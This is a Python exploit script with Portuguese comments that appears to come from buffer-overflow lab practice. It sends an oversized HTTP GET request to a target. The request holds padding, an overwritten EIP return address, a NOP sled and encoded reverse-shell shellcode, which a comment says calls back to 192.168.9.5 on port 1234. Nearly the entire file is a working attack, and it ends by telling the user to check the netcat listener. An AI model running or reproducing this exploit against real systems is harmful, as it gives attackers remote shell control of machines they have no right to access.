#!/usr/bin/python

import argparse
import socket
import time
from struct import pack

# Configurar o argparse
parser = argparse.ArgumentParser(description="Enviar padrão com o offset já encontrado para verificar os bytes correspondentes ao EIP")
parser.add_argument("client_ip", type=str, help="O endereço IP do cliente")
parser.add_argument("client_port", type=int, help="A porta do cliente")
parser.add_argument("offset", type=int, help="Offset de Crash")
parser.add_argument("eip_alvo", type=str, help="EIP Alvo (Ex: 0x080414c3)")


# Analisar os argumentos
args = parser.parse_args()

# Endereço de Memória para EIP Alvo
eip_int = int(args.eip_alvo,16)
eip = pack('<I', eip_int)

# Reverse Shell - 192.168.9.5 1234
# Badchars -  \x00\x0d
revshell = ( 
    b""
    b"\xba\xa3\xbe\x2f\xbf\xd9\xce\xd9\x74\x24\xf4\x5e\x29"
    b"\xc9\xb1\x52\x83\xc6\x04\x31\x56\x0e\x03\xf5\xb0\xcd"
    b"\x4a\x05\x24\x93\xb5\xf5\xb5\xf4\x3c\x10\x84\x34\x5a"
    b"\x51\xb7\x84\x28\x37\x34\x6e\x7c\xa3\xcf\x02\xa9\xc4"
    b"\x78\xa8\x8f\xeb\x79\x81\xec\x6a\xfa\xd8\x20\x4c\xc3"
    b"\x12\x35\x8d\x04\x4e\xb4\xdf\xdd\x04\x6b\xcf\x6a\x50"
    b"\xb0\x64\x20\x74\xb0\x99\xf1\x77\x91\x0c\x89\x21\x31"
    b"\xaf\x5e\x5a\x78\xb7\x83\x67\x32\x4c\x77\x13\xc5\x84"
    b"\x49\xdc\x6a\xe9\x65\x2f\x72\x2e\x41\xd0\x01\x46\xb1"
    b"\x6d\x12\x9d\xcb\xa9\x97\x05\x6b\x39\x0f\xe1\x8d\xee"
    b"\xd6\x62\x81\x5b\x9c\x2c\x86\x5a\x71\x47\xb2\xd7\x74"
    b"\x87\x32\xa3\x52\x03\x1e\x77\xfa\x12\xfa\xd6\x03\x44"
    b"\xa5\x87\xa1\x0f\x48\xd3\xdb\x52\x05\x10\xd6\x6c\xd5"
    b"\x3e\x61\x1f\xe7\xe1\xd9\xb7\x4b\x69\xc4\x40\xab\x40"
    b"\xb0\xde\x52\x6b\xc1\xf7\x90\x3f\x91\x6f\x30\x40\x7a"
    b"\x6f\xbd\x95\x2d\x3f\x11\x46\x8e\xef\xd1\x36\x66\xe5"
    b"\xdd\x69\x96\x06\x34\x02\x3d\xfd\xdf\xed\x6a\xf4\x1a"
    b"\x86\x68\x06\x21\x84\xe4\xe0\x43\x38\xa1\xbb\xfb\xa1"
    b"\xe8\x37\x9d\x2e\x27\x32\x9d\xa5\xc4\xc3\x50\x4e\xa0"
    b"\xd7\x05\xbe\xff\x85\x80\xc1\xd5\xa1\x4f\x53\xb2\x31"
    b"\x19\x48\x6d\x66\x4e\xbe\x64\xe2\x62\x99\xde\x10\x7f"
    b"\x7f\x18\x90\xa4\xbc\xa7\x19\x28\xf8\x83\x09\xf4\x01"
    b"\x88\x7d\xa8\x57\x46\x2b\x0e\x0e\x28\x85\xd8\xfd\xe2"
    b"\x41\x9c\xcd\x34\x17\xa1\x1b\xc3\xf7\x10\xf2\x92\x08"
    b"\x9c\x92\x12\x71\xc0\x02\xdc\xa8\x40\x22\x3f\x78\xbd"
    b"\xcb\xe6\xe9\x7c\x96\x18\xc4\x43\xaf\x9a\xec\x3b\x54"
    b"\x82\x85\x3e\x10\x04\x76\x33\x09\xe1\x78\xe0\x2a\x20"
    )

    
# Variáveis de entrada
client_ip = args.client_ip
client_port = args.client_port
offset = args.offset
payload = b"GET "  # Único ponto de envio de dados para aplicação
payload += b"A"*offset
payload += eip
payload += b"\x90" * 32 # NOPs
# Foi necessário usar 16 NOPs para funcionar, com 12 não funcionava de jeito nenhum.
payload += revshell
payload += b" HTTP/1.1\r\n\r\n" # Através da requisição HTTP



try:
    # Cria conexão e envia o payload
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((client_ip, client_port))
    print("[+] Enviando Buffer de {} 'A', EIP: {} e Shellcode de {} bytes [+]\n".format(str(offset), str(eip), len(revshell)))
    client.send(payload)
    print("Segura o desespero, espera 10s")
    time.sleep(15)
    client.close()
except ConnectionResetError:
    print(f"Reset Error!")

print("Olhe o NC agora!")